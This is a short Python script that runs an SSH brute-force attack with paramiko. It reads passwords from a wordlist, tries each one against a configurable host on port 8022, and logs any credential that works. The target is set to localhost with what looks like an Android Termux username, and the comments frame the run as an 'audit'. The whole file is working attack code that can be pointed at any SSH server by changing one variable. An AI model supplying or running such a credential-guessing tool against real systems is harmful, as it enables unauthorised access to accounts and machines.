import paramiko
import socket
import time  # New: for rate-limiting

def ssh_brute_force(target_ip, username, password_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # New: Open a log file to record the session
        with open("audit_log.txt", "a") as log:
            log.write(f"\n--- Audit Session Started: {time.ctime()} ---\n")
            
            with open(password_file, 'r') as file:
                for line in file:
                    password = line.strip()
                    try:
                        print(f"[*] Testing: {password}")
                        ssh.connect(target_ip, username=username, password=password, timeout=2, port=8022)
                        
                        success_msg = f"[!] SUCCESS: Authorized credential found: {password}"
                        print(success_msg)
                        log.write(success_msg + "\n") # Log the success
                        ssh.close()
                        return
                    except paramiko.AuthenticationException:
                        # New: Adding a small delay to respect rate-limits
                        time.sleep(0.5) 
                        continue
                    except socket.error as e:
                        print(f"[X] Connection error: {e}")
                        return
    except FileNotFoundError:
        print("[X] Error: Wordlist not found.")

# Configuration
target = "127.0.0.1"
user = "u0_a427"
pass_list = "custom_passwords.txt"

if __name__ == "__main__":
    ssh_brute_force(target, user, pass_list)


